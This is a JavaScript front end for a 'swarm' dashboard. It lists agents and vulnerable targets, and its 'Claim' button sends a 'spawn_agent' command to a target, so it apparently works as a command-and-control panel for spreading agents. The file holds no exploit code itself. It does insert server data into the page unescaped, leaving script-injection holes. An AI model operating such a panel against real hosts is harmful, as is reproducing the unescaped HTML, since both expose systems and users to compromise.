let emergencyMode = false;
let allAgents = [];
let allTargets = [];

async function fetchData() {
    const token = document.getElementById('token').value;
    if (!token) {
        alert('Please enter a valid JWT token');
        return;
    }
    const response = await fetch('/api/data', {
        headers: { 'Authorization': `Bearer ${token}` }
    });
    if (!response.ok) {
        alert('Failed to fetch data: Invalid token');
        return;
    }
    const data = await response.json();
    
    allAgents = data.agents;
    filterAgents();
    allTargets = data.targets;
    filterTargets();

    const emergencyLogs = document.getElementById('emergencyLogs');
    emergencyLogs.innerHTML = '';
    data.emergency_logs.forEach(log => {
        emergencyLogs.innerHTML += `
            <tr>
                <td>${log.agent_id}</td>
                <td>${log.action}</td>
                <td>${JSON.stringify(log.details)}</td>
                <td>${log.timestamp}</td>
            </tr>`;
    });

    const activityLog = document.getElementById('activityLog');
    activityLog.innerHTML = '';
    data.reports.forEach(report => {
        activityLog.innerHTML += `<p>${report.timestamp} | ${report.agent_id}: ${JSON.stringify(report.data)}</p>`;
    });

    const trafficData = data.reports.map(report => report.data.network_traffic || 0);
    const labels = data.reports.map(report => report.timestamp);
    const ctxTraffic = document.getElementById('trafficChart').getContext('2d');
    new Chart(ctxTraffic, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Network Traffic',
                data: trafficData,
                borderColor: emergencyMode ? '#ff0000' : '#00ff00',
                backgroundColor: emergencyMode ? 'rgba(255, 0, 0, 0.2)' : 'rgba(0, 255, 0, 0.2)',
                fill: true
            }]
        },
        options: { scales: { y: { beginAtZero: true } } }
    });

    const threatData = data.reports.map(report => report.data.is_anomaly ? 1 : 0);
    const ctxThreat = document.getElementById('threatChart').getContext('2d');
    new Chart(ctxThreat, {
        type: 'bar',
        data: {
            labels: labels,
            datasets: [{
                label: 'Threats Detected',
                data: threatData,
                backgroundColor: emergencyMode ? 'rgba(255, 0, 0, 0.5)' : 'rgba(0, 255, 0, 0.5)'
            }]
        },
        options: { scales: { y: { beginAtZero: true } } }
    });

    const networkContainer = document.getElementById('network');
    const network = new vis.Network(networkContainer, data.network, {
        nodes: { shape: 'dot', size: 20 },
        edges: { arrows: 'to' },
        physics: { enabled: true }
    });

    const agentSelect = document.getElementById('agentId');
    agentSelect.innerHTML = '<option value="">Select Agent</option>';
    data.agents.forEach(agent => {
        agentSelect.innerHTML += `<option value="${agent.agent_id}">${agent.agent_id}</option>`;
    });

    const tagline = document.getElementById('tagline');
    if (emergencyMode) {
        tagline.classList.add('emergency-mode');
        tagline.innerText = 'Swarm Apocalypse Protocol Engaged.';
        new Audio('https://freesound.org/data/previews/316/316847_4939433-lq.mp3').play();
    } else {
        tagline.classList.remove('emergency-mode');
        tagline.innerText = 'The Swarm Devours All Threats.';
    }
}

function filterAgents() {
    const filter = document.getElementById('agentFilter').value.toLowerCase();
    const agentsTable = document.getElementById('agentsTable');
    agentsTable.innerHTML = '';
    allAgents.forEach(agent => {
        if (agent.agent_id.toLowerCase().includes(filter) || agent.status.toLowerCase().includes(filter)) {
            agentsTable.innerHTML += `
                <tr>
                    <td>${agent.agent_id}</td>
                    <td>${agent.status}</td>
                    <td>${agent.last_seen}</td>
                    <td>${agent.ip}</td>
                </tr>`;
        }
    });
}

function filterTargets() {
    const filter = document.getElementById('targetFilter').value.toLowerCase();
    const targetsTable = document.getElementById('targetsTable');
    targetsTable.innerHTML = '';
    allTargets.forEach(target => {
        if (target.target.toLowerCase().includes(filter) || JSON.stringify(target.vulnerability).toLowerCase().includes(filter) || target.status.toLowerCase().includes(filter)) {
            targetsTable.innerHTML += `
                <tr>
                    <td>${target.target}</td>
                    <td>${JSON.stringify(target.vulnerability)}</td>
                    <td>${target.status}</td>
                    <td>${target.score.toFixed(2)}</td>
                    <td>${target.timestamp}</td>
                    <td><button onclick="sendCommand('${target.target}', 'spawn_agent')">Claim</button></td>
                </tr>`;
        }
    });
}

async function sendCommand(target = null, action = null) {
    const token = document.getElementById('token').value;
    if (!token) {
        alert('Please enter a valid JWT token');
        return;
    }
    const agentId = document.getElementById('agentId').value;
    const commandAction = action || document.getElementById('action').value;
    const commandTarget = target || document.getElementById('target').value;
    const params = document.getElementById('params').value || '{}';
    const emergency = document.getElementById('emergency').checked;
    emergencyMode = emergency;

    const response = await fetch('/command', {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
            agent_id: agentId,
            action: commandAction,
            target: commandTarget,
            params: JSON.parse(params),
            emergency: emergency
        })
    });
    const result = await response.json();
    alert(result.status);
    fetchData();
}

fetchData();
setInterval(fetchData, 10000);